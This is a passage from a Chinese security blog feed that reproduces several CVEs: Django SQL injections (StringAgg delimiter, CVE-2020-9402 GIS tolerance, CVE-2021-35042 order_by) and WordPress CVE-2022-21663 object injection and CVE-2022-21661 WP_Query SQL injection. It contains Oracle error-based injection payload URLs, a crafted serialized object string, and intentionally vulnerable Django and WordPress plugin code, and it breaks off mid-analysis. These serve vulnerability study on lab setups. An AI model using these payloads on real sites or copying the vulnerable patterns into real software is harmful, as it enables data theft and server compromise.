class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> django.shortcuts import render, HttpResponse<br><span class="hljs-keyword">from</span> .models import Collection<br><span class="hljs-keyword">from</span> django.contrib.postgres.aggregates.general import StringAgg<br><br><span class="hljs-comment"># Create your views here.</span><br><br>def vuln(request):<br>    query = request.GET.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;q&#x27;</span>, <span class="hljs-attribute">default</span>=0.05)<br>    qs = Collection.objects.annotate(<span class="hljs-attribute">tempname</span>=StringAgg(&#x27;name&#x27;, <span class="hljs-attribute">delimiter</span>=query))<br>    <span class="hljs-built_in">print</span>(qs.query)<br>    return HttpResponse(qs)<br><br></code></pre></td></tr></table></figure><p><code>models.py</code></p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-title">from</span> django.db <span class="hljs-keyword">import</span> models<br><span class="hljs-title">from</span> django.contrib.postgres.fields <span class="hljs-keyword">import</span> JSONField<br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">Collection</span>(<span class="hljs-title">models</span>.<span class="hljs-type">Model</span>):</span><br><span class="hljs-class">    name = models.<span class="hljs-type">CharField</span>(<span class="hljs-title">max_length</span>=128)</span><br><span class="hljs-class">    detail = models.<span class="hljs-type">CharField</span>(<span class="hljs-title">max_length</span>=128)</span><br><span class="hljs-class"></span><br><span class="hljs-class">    def __str__(<span class="hljs-title">self</span>):</span><br><span class="hljs-class">        return self.name</span><br><span class="hljs-class"></span><br></code></pre></td></tr></table></figure><p><code>urls.py</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> django.contrib <span class="hljs-keyword">import</span> <span class="hljs-keyword">admin</span><br><span class="hljs-keyword">from</span> django.urls <span class="hljs-keyword">import</span> <span class="hljs-type">path</span><br><span class="hljs-keyword">from</span> vuln <span class="hljs-keyword">import</span> views<br><br><br>urlpatterns = [<br>    path(<span class="hljs-string">&#x27;admin/&#x27;</span>, <span class="hljs-keyword">admin</span>.site.urls),<br>    path(<span class="hljs-string">&#x27;vuln/&#x27;</span>, views.vuln),<br>]<br><br></code></pre></td></tr></table></figure><p>最后可以得到如下 <code>poc</code></p><p><img src="20220921231943.png" alt="1"></p><h2 id="0x04-CVE-2020-9402"><a href="#0x04-CVE-2020-9402" class="headerlink" title="0x04 CVE-2020-9402"></a>0x04 CVE-2020-9402</h2><h3 id="漏洞描述-2"><a href="#漏洞描述-2" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2020年发布的安全更新，修复了在 <code>GIS</code> 查询功能中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-2"><a href="#漏洞影响-2" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 2.2.x &lt; 2.2.11</li><li>Django 1.11.x &lt; 1.11.29</li><li>Django 3.0.x &lt; 3.0.4</li></ul><p>需要使用了 <code>GIS</code> 聚合查询，用户使用 <code>oracle</code> 的数据库且存在可控 <code>tolerance</code> </p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看 <code>github</code> 的分析  <code>https://github.com/django/django/commit/fe886a3b58a93cfbe8864b485f93cb6d426cd1f2</code></p><p><img src="20220921205621.png" alt="1"></p><p>这里修补了两处漏洞，都是同一个参数 <code>tolerance</code> 引起的，看到这里会觉得还比较简单，直接从 <code>self.extra</code> 中获取到参数，直接进行拼接，得到最后的 <code>sql</code> 代码，<code>as_oracle</code> 方法，就是得到的 <code>oracle</code> 的 <code>sql</code> 代码，也就是这个漏洞应该只存在于使用 <code>oracle</code> 数据库时</p><p>虽然知道这里存在漏洞，我们更重要的是去获取什么时候会触发这两个漏洞，所以要去看代码，可以直接搜索 <code>tolerance</code></p><h4 id="第一处漏洞"><a href="#第一处漏洞" class="headerlink" title="第一处漏洞"></a>第一处漏洞</h4><p>位于 <code>django\contrib\gis\db\models\aggregates.py</code></p><p><img src="20220921210237.png" alt="1"></p><p>此类继承于 <code>django.db.models.aggregates.Aggregate</code> ，然后下面这个 <code>Union</code> 类又继承 <code>GeoAggregate</code> </p><p><img src="20220921210544.png" alt="1"></p><p>因此可以通过使用 <code>GIS</code> 中的 <code>Union</code> 类来触发第一个漏洞</p><h4 id="第二处漏洞"><a href="#第二处漏洞" class="headerlink" title="第二处漏洞"></a>第二处漏洞</h4><p>位于 <code>django\contrib\gis\db\models\functions.py</code></p><p><img src="20220921211016.png" alt="1"></p><p>这里逻辑也是一样，没有任何过滤，接下来就是去找可以直接调用这里的位置，也就是找继承的位置，可以找到下面这个 <code>Distance</code></p><p><img src="20220921211202.png" alt="1"></p><p>至于接下来该如何去直接使用这两个类，可以查看官方文档，这里我直接看的 <code>vulhub</code> 中的</p><p><img src="20220921211336.png" alt="1"></p><h3 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现直接借助了 <code>vulhub</code> 的环境，直接启动，环境代码可以直接在最下面的参考链接中找到</p><p>第一处 <code>payload</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span>/vuln/q=?<span class="hljs-number">20</span>) = <span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> (<span class="hljs-keyword">select</span> utl_inaddr.get_host_name((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">FROM</span> v$instance)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">OR</span> (<span class="hljs-number">1</span><span class="hljs-number">-1</span><br></code></pre></td></tr></table></figure><p><img src="image-20220921212748553.png" alt="1"></p><p>第二处 <code>payload</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8000</span>/vuln2/q=?<span class="hljs-number">0.05</span>))) <span class="hljs-keyword">FROM</span> &quot;VULN_COLLECTION2&quot; <span class="hljs-keyword">where</span> (<span class="hljs-keyword">select</span> utl_inaddr.get_host_name((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">FROM</span> DUAL)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure><p><img src="image-20220921212404303.png" alt="1"></p><h2 id="0x05-CVE-2021-35042"><a href="#0x05-CVE-2021-35042" class="headerlink" title="0x05 CVE-2021-35042"></a>0x05 CVE-2021-35042</h2><h3 id="漏洞描述-3"><a href="#漏洞描述-3" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><code>Django</code> 在2021年发布的安全更新，修复了在 <code>order_by </code> 中存在的 <code>SQL</code> 注入漏洞。</p><h3 id="漏洞影响-3"><a href="#漏洞影响-3" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul><li>Django 3.1.x &lt; 3.1.13</li><li>Django 3.2.x &lt; 3.2.5</li></ul><p>需要使用了 <code>order_by </code> </p><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>出现问题的点是在 <code>order_by</code> ，先搜索这个方法</p><p><img src="20220922105526.png" alt="1"></p><p>首先 <code>clean_ordering</code> ，也就是将 <code>ordering</code> 置空</p><p><img src="image-20220922105747504.png" alt="1"></p><p>然后进行 <code>add_ordering</code></p><p><img src="20220922105840.png" alt="1"></p><p>想要将传进来的字段添加到 <code>order_by</code> ，需要经过一些验证</p><p>将每一部分取出来进行比较，是字符串时进行比较，包含点号时，直接 <code>continue</code> ，跳过了后面的 <code>names_to_path</code> 验证，因此可以通过添加点号的形式绕过。</p><p>处理带点号的代码位于文件 <code>django/db/models/sql/compiler.py </code>的 <code>get_order_by </code>函数中，核心代码如下</p><p><img src="20220922162157.png" alt="1"></p><p>在这里对 <code>table</code> 进行了过滤，但是并没有对 <code>col</code> 进行过滤，因此造成了注入。</p><h3 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>复现直接借助了 <code>vulhub</code> 的环境，直接启动，环境代码可以直接在最下面的参考链接中找到</p><p>简单来个报错的 <code>payload</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8000</span><span class="hljs-regexp">/vuln/</span>?order=aaa.ta<span class="hljs-string">b&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="20220922163320.png" alt="1"></p>]]></content>
    
    
    <categories>
      
      <category>Python漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入漏洞</tag>
      
      <tag>CVE</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>Python</tag>
      
      <tag>Django</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WordPress_5.8.2_对象注入漏洞_CVE-2022-21663</title>
    <link href="/2022/02/16/WordPress-5-8-2-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21663/"/>
    <url>/2022/02/16/WordPress-5-8-2-%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21663/</url>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1303">https://forum.butian.net/share/1303</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>看了 <code>wordpress</code>注入（ <code>CVE-2022-21661</code> ）的洞之后，发现还存在另外一个对象注入漏洞，具有管理员权限的用户通过更改一些选项，将有机会 <code>getshell</code>。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>getshell</code>的条件：</p><ul><li><p><code>wordpress &lt; 5.8.3</code></p></li><li><p>启用多站点模式</p></li><li><p>存在一条可用的反序列化链（在本文中不会讲这个）</p></li></ul><p>这是 <code>github</code>上的漏洞修复记录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/WordPress/</span>WordPress<span class="hljs-regexp">/commit/</span><span class="hljs-number">66</span>bb979049fa1a515d031e53ab100d507ed7bc8b<br></code></pre></td></tr></table></figure><p><img src="1645017413692-340e0a04-00f9-4ac1-be41-896ad2f07c85.png" alt="1"></p><p>因此这里的环境选择前一条提交</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/WordPress/WordPress</span><br>git checkout <span class="hljs-number">7</span>d20ea9<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>这里是以我复现这个漏洞时候的角度来分析的，因此会有一些弯路</p><h3 id="漏洞入口点"><a href="#漏洞入口点" class="headerlink" title="漏洞入口点"></a>漏洞入口点</h3><p>首先来到 <code>wp-admin/upgrade.php</code>，这是管理员可以直接访问到的文件，也是我认为的此漏洞的入口点。</p><p><img src="1645016015891-21b5b1a1-46d9-404a-8801-e6c89a6f7fbc.png" alt="1"></p><p>跟进 <code>wp_upgrade</code>函数，来到 <code>wp-admin/includes/upgrade.php</code></p><p><img src="1645016103918-353490ff-585c-4a2a-960a-330be6f1acad.png" alt="1"></p><p>首先看几个全局变量，<code>$wp_db_version</code>在 <code>wp-includes/version.php</code>中定义，根据其定义处的注释来看，这是本安装程序的数据库版本，在下一行中从数据库中取出了 <code>db_version</code>赋值给 <code>$wp_current_db_version</code>，看这情况，大概是一个是固定的数据库版本，另一个是可变的，<code>upgrade.php</code>会时不时地比较，当发生改变时，会进行一些操作</p><p>接下来看到我下的断点处，进入 <code>upgrade_all()</code>函数</p><p><img src="1645016595248-a63a464a-0cbc-4203-bfe2-b192e18d0227.png" alt="1"></p><p>这里就是在将两个版本进行比较，一致时不发生任何变化，不一致时运行后面的代码，接着看下面</p><p><img src="1645016658540-437ff7af-3fdb-414f-ba4a-db536ec3197f.png" alt="1"></p><p>根据从数据库中取出的 <code>db_version</code>也就是此处的 <code>$wp_current_db_version</code>的大小，会进行不同的处理，我们来关注断点处的 <code>upgrade_280</code>函数</p><p><img src="1645016845600-d2145051-be96-4802-9733-ba339c957596.png" alt="1"></p><p>看到 1611 行的 <code>is_multisite()</code>，跟进</p><p><img src="1645016943319-8531ffcb-c3ff-4525-bce6-849147549291.png" alt="1"></p><p>这是一个判断是否开启了多站点的函数，这也是本漏洞的一个开启条件，必须要开启多站点才可以。开多站点需要改配置文件，我这里图省事儿，直接改了判断条件 <code>!is_multisite()</code>，强行让他绕过了 </p><p>继续看上面，进入循环，每次从 <code>wp_options</code>表中取 20 条数据，将每一条数据都进行反序列化，漏洞的点就在此处了，因为 <code>wp_options</code>中的数据大部分都是可控的，我们可以通过管理员修改其值，最后进入反序列化。</p><p>还有两个问题，第一，如何控制 <code>db_version</code>的值，让他进入我们想要进入的函数；第二，如何更改 <code>wp_options</code>中的值。</p><h3 id="数据写入"><a href="#数据写入" class="headerlink" title="数据写入"></a>数据写入</h3><p>其实这两个是同一个问题，一并解决，<code>wordpress</code>后台没有直接访问所有 <code>options</code>的按钮，但我们可以访问 <code>wp-admin/options.php</code></p><p><img src="1645017818708-9ea5b601-fcba-4f81-ad90-1c66eb516163.png" alt="1"></p><p>这里可以更改 <code>db_options</code>中大部分的值，包括 <code>db_version</code>，我们将其修改为 10300，就满足了进入漏洞函数的要求，接下来我们尝试写入反序列化字符串</p><p>我们先随便选择一个选项写入反序列化字符串，这里我首先选择的是 <code>blogdescription</code>，也就是博客描述，这个也可以在常规选项中更改（更建议，因为需要处理的值会更少，调试没那么费力）,<code>post</code>的数据会逐个进入 <code>wp-includes/option.php</code>中的 <code>update_option</code>，来看几个比较重要的函数（PS：太长截图截不完）</p><p><img src="1645018862918-8acd7c3e-15ce-4cda-a723-210ef2901ffe.png" alt="1"></p><p>这里首先说明一下 <code>$option</code>是每个选项的键，<code>$value</code>是每个选项的值</p><p>首先看到 <code>sanitize_option</code></p><p><img src="1645019077487-63d2de3b-61aa-4518-b451-da43f296998b.png" alt="1"></p><p>这个函数会根据不同的键来选择不同的处理方式，比如一些一定会用整数的，就会<code>intval</code>处理，所以选择的选项也是有讲究的，我之前选择的<code>blogdescription</code>，就因为这个函数而无法使用，他会将一些特殊字符编码，导致无法正常反序列化，这个可以慢慢尝试，尽量选择这个函数不会进行太多处理的选项</p><p>最终我选择的是 <code>wp-admin/options-writing.php</code>中的 “密码”（选择 <code>options.php</code>中的<code>mailserver_pass</code>也一样，是同一个），一般来说，密码对字符都不会有太多的限制，至少这里是的</p><p>回到之前的 <code>update_option</code>的代码，稍微注意一下这里的比较</p><p><img src="1645019573871-fdeab791-ede5-4600-a056-4f7078ebbd2f.png" alt="1"></p><p>如果我们输入的选择没有发生改变，就不会继续后面的代码，继续往下走，进入 <code>wp-includes/functions.php</code>中的<code>maybe_serialize</code>函数</p><p><img src="1645019673851-234d1ec8-df55-4aca-9061-e5135495d0b3.png" alt="1"></p><p>如果是数组或者对象，那么会直接序列化后返回。然后进入 <code>is_serialized</code>函数</p><p><img src="1645019938888-04cd4b78-79fd-4241-b3af-ff47887561e6.png" alt="1"></p><p>这里会取字符串的第一个字符进行比较，这里几乎囊括了反序列化字符串的所有类型，遇到是这一些的，返回后会再次反序列化，也就是进行了二次反序列化，这样几乎是防止了可能的反序列化。</p><p>这里遗漏了一个 <code>C</code>类型，官方文档对他的描述是 <code>custom object</code>，自定义对象，这个以前几乎没有用到过，因此这次进行了一次测试</p><p>代码：</p><p><img src="1645020351734-9990d977-de53-4a24-aca9-bd63b028f825.png" alt="1"></p><p>结果</p><p><img src="1645020369446-b14a18bd-de76-4cff-a147-8a6be7c72f58.png" alt="1"></p><p>同一个类，将类型从 <code>O</code>修改为了 <code>C</code>，反序列化运行后，虽然报错，但最后仍然会触发 <code>__destruct</code>方法，因此我们可以将一个正常的反序列化字符串，将第一个字符 <code>O</code>修改为 <code>C</code>，这样就可以逃过这里的二次反序列化，从而将我们的反序列化字符串写入数据库，等待触发即可。</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p>本菜鸡找不到 <code>wordpress</code>的链子，只能随意触发一个 <code>__destruct</code>意思意思</p><p>这里使用 <code>wp-includes/Requests/Transport/cURL.php</code>中的 <code>Requests_Transport_cURL</code>类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">C:<span class="hljs-number">23</span>:<span class="hljs-string">&quot;Requests_Transport_cURL&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<br></code></pre></td></tr></table></figure><p><img src="1645023884766-f85640ae-ec93-4dc7-8628-ac65c61c434b.png" alt="1"></p><p>查看数据库，并没有被二次序列化</p><p><img src="1645023970947-30b7edf1-91c0-48c7-bc57-5b393204ccfd.png" alt="1"></p><p>来到<code>wp-admin/options.php</code>，将 <code>db_version</code>修改为 10300</p><p><img src="1645023029331-b66ec169-d09a-4e68-99bf-e518e70d140a.png" alt="1"></p><p>这里一个意外的发现，修改数据库的时候就会触发漏洞入口</p><p><img src="1645023123738-90cfe6b9-ba3c-4223-bc49-51f3bbb56096.png" alt="1"></p><p>成功取出数据库中的反序列化串，并且执行反序列化</p><p><img src="1645024213088-02a0060d-93be-4e5b-8af9-b9fe7e7b1d9a.png" alt="1"></p><p>触发 <code>__destruct</code>方法</p><p><img src="1645024236432-924e1694-930c-4678-bd14-82905aed5cb9.png" alt="1"></p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>坑点不少，需要多琢磨，不说了，还是太菜了，都没法搞条链子。</p>]]></content>
    
    
    <categories>
      
      <category>PHP漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>CVE</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>WordPress</tag>
      
      <tag>对象注入漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WordPress_5.8.2_核心SQL注入漏洞_CVE-2022-21661</title>
    <link href="/2022/02/15/WordPress-5-8-2-%E6%A0%B8%E5%BF%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21661/"/>
    <url>/2022/02/15/WordPress-5-8-2-%E6%A0%B8%E5%BF%83SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2022-21661/</url>
    
    <content type="html"><![CDATA[<p>本文首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1324">https://forum.butian.net/share/1324</a></p><p>本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。</p><h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00 漏洞描述"></a>0x00 漏洞描述</h2><p>这是最近爆出来的一个 <code>wordpress</code>的<code>SQL</code>注入漏洞，实际上不是一个可以直接利用的洞，而是<code>wordpress</code>的一个核心函数 <code>WP_Query</code>的漏洞，这个函数常被插件使用，因此能造成的危害也挺大，前台后台都有可能。</p><h2 id="0x01-漏洞影响"><a href="#0x01-漏洞影响" class="headerlink" title="0x01 漏洞影响"></a>0x01 漏洞影响</h2><p><code>wordpress &lt; 5.8.3</code></p><p>这里是修复链接</p><p><a href="https://github.com/WordPress/WordPress/commit/6f7032dcf423b67f90381d4f29a90d16f4829070">https://github.com/WordPress/WordPress/commit/6f7032dcf423b67f90381d4f29a90d16f4829070</a></p><p><img src="1645102019548-1c3129e9-7c36-4ce2-9de3-8cd16cb0ae77.png" alt="image.png"></p><p>我们 <code>git</code>下载后，恢复到上一个版本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">git <span class="hljs-keyword">clone</span> https:<span class="hljs-comment">//github.com/WordPress/WordPress</span><br>git checkout <span class="hljs-number">266</span>c58518846<br></code></pre></td></tr></table></figure><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>因为此漏洞在插件中出现较多，因此这里我们也造一个插件来进行测试复现，网上已经有师傅写好了 <code>demo</code>，我这里直接用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Plugin Name: CVE-2022-21661-test-plugin</span><br><span class="hljs-comment">Plugin URL: https://www.lsablog.com/networksec/penetration/cve-2022-21661-wordpress-core-sqli-analysis</span><br><span class="hljs-comment">Description: This plugin was made in order to test CVE-2022-21661 (wordpress core sql injection)</span><br><span class="hljs-comment">Version: v1.0</span><br><span class="hljs-comment">Author: LSA</span><br><span class="hljs-comment">Author&#x27;s Blog: https://www.lsablog.com/</span><br><span class="hljs-comment">License: MIT</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">testSQLiCVE202221661</span>(<span class="hljs-params"></span>)</span>&#123;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;test-cve-2022-21661-plugin&#x27;</span>;<br><br>    <span class="hljs-variable">$inputData</span> = <span class="hljs-title function_ invoke__">stripslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-variable">$jsonDecodeInputData</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$inputData</span>,<span class="hljs-literal">true</span>);<br>    <span class="hljs-variable">$wpTest</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WP_Query</span>(<span class="hljs-variable">$jsonDecodeInputData</span>);<br>    <span class="hljs-title function_ invoke__">wp_die</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">add_action</span>(<span class="hljs-string">&#x27;wp_ajax_nopriv_testcve202221661&#x27;</span>,<span class="hljs-string">&#x27;testSQLiCVE202221661&#x27;</span>);<br></code></pre></td></tr></table></figure><p>写入 <code>php</code>文件，打包成 <code>zip</code>格式，后台安装插件并启用</p><p>这里的插件是不用权限就可以访问的，<code>admin</code>权限访问反而存在问题，正常访问显示如下</p><p><img src="1645103521554-d2846aaf-7df3-46e6-a553-003e4d061141.png" alt="image.png"></p><p>好了，接下来开始调试，看到插件代码，位于 <code>wp-content/plugins/CVE-2022-21661-test-plugin/CVE-2022-21661-test-plugin.php</code></p><p><img src="1645103635627-6bddf23b-653a-4b46-b4c8-3f3cb0f75a9b.png" alt="image.png"></p><p><code>post</code>的<code>data</code>使用了 <code>stripslashes</code>，<code>post</code>的参数默认会被转义，因此用这个函数去掉转义符等，然后 <code>json_decode</code>解码，也就是说我们传入的数据需要是 <code>json</code>格式的，最后传入 <code>WP_Query</code></p><p>跟进 <code>wp-includes/class-wp-query.php</code>的构造方法</p><p><img src="1645104192903-4b660d49-8c12-4c3a-8962-dde93ee542c6.png" alt="image.png"></p><p>继续跟进 <code>query</code>方法</p><p><img src="1645104421273-bc080a34-fa1a-4c53-8e20-aeeff30a5855.png" alt="image.png"></p><p><code>$query</code>是我们传入的 <code>json</code>解码后的数据，处理一下后进入 <code>get_posts</code>方法</p><p><img src="1645104830365-2be61a3c-870b-4018-a423-0f88356f5293.png" alt="image.png"></p><p>将 <code>$this-&gt;query_vars</code>赋值给了 <code>$q</code>，然后还加入了一些其他的参数，因此 <code>$q</code>部分可控，继续往下看</p><p><img src="1645105048461-3fc7776d-941d-4d52-95f0-9975d9fe1fa5.png" alt="image.png"></p><p><code>$this-&gt;is_singular</code>默认为 <code>false</code>，进入 <code>if</code>语句，然后使用 <code>parse_tax_query</code>方法处理 <code>$q</code>，我们看看代码</p><p><img src="1645340595117-4f864e36-96ca-4bf9-968e-33c3e2e2d0fe.png" alt="image.png"></p><p>在这里，<code>$q</code>中存在的一些值会赋值给 <code>$tax_query</code>，比如，<code>$q</code>中存在 <code>tax_query</code>这个键并且是数组的时候，就会将他的值存入 <code>$tax_query</code>，拉到最后可以看到实例化了 <code>WP_Tax_Query</code>，而 <code>$tax_query</code>的值就会作为初始化的值传入 <code>WP_Tax_Query</code></p><p><img src="1645340962424-faaba21b-6d7a-4359-a1cb-62f87e39c70a.png" alt="image.png"></p><p>看到 <code>wp-includes/class-wp-tax-query.php</code>中的 <code>__construct</code></p><p><img src="1645341126441-5696c72f-5575-4977-b827-17a1da1dcfc7.png" alt="image.png"></p><p>跟进 <code>sanitize_query</code>方法</p><p><img src="1645356871711-d4b92b4a-59b2-4932-b26c-553a4ab1afa9.png" alt="image.png"></p><p>这里是对 <code>$queries</code>的一些处理，返回值为 <code>$cleaned_query</code>，因此要找到可控的赋值</p><p><code>foreach</code>遍历 <code>$queries</code>，使用<code>is_first_order_clause</code>进行判断</p><p><img src="1645369819185-0728e203-6978-416a-87f5-74f6db6d42b7.png" alt="image.png"></p><p><code>$query</code>中存在一个值为数组，且数组的键为 <code>terms</code>就进入该分支，<code>$queries</code> 部分可控，因此很容易满足这个条件，最后和 <code>defaults</code>合并后存入 <code>$cleaned_query</code></p><p>这里返回后的数据最后会赋值给 <code>$this-&gt;queries</code>，后面会用到这个数据</p><p>回到比较上面的<code>$this-&gt;tax_query-&gt;get_sql</code>，进入 <code>wp-includes/class-wp-tax-query.php</code>的 <code>get_sql</code>方法</p><p><img src="1645107644418-acac8222-7735-4e62-b20c-3d04a08d67a6.png" alt="image.png"></p><p>继续跟进 <code>get_sql_clauses</code>方法</p><p><img src="1645107786798-70da1fb4-92a8-49eb-90be-5a0af23a5d7a.png" alt="image.png"></p><p>这里就将 <code>$this-&gt;queries</code>取出来了，然后进入 <code>get_sql_for_query</code>方法</p><p><img src="1645109146065-168ca4d9-2bd8-46cd-ab6e-8e128dcfef3f.png" alt="image.png"></p><p>遍历 <code>$query</code>，当 <code>$clause</code>为数组时，进入 <code>elseif</code>分支，再跟进 <code>is_first_order_clause</code>方法进行判断</p><p><img src="1645109296540-adb8ff54-9bfb-43eb-8314-2db1e6abff59.png" alt="image.png"></p><p>这个判断很简单，为数组且包含 <code>terms</code>这个键时为真，继续跟进上面的 <code>get_sql_for_clause</code></p><p><img src="1645109675055-b98c4529-6679-4a87-b062-e5fc4b9253f6.png" alt="image.png"></p><p>主要看到这个 <code>clean_query</code>方法，也是漏洞点所在的位置，这实际上是一个用于过滤潜在的危险的函数</p><p><img src="1645109756537-8e1e4e30-45d8-4869-b87f-e8cb01102056.png" alt="image.png"></p><p>前面的都是一些简单的判断，很容易就可以绕过，<code>$query[&#39;terms&#39;]</code>去重，最后进入 <code>transform_query</code>方法</p><p><img src="1645110303953-72fa8b9d-66fe-4521-93d7-5c719cbcf207.png" alt="image.png"></p><p>满足条件 <code>$query[&#39;field&#39;] == $resulting_field</code>即可绕过这个方法，不进行其他操作</p><p>回到 <code>get_sql_for_clause</code>方法，执行完 <code>clean_query</code>后的代码如下</p><p><img src="1645110644316-5c34cca6-eb90-448b-99ed-b2b380cc3b8c.png" alt="image.png"></p><p><code>$terms</code>接收 <code>clean_query</code>方法处理过的 <code>$clause[&#39;terms&#39;]</code>，当 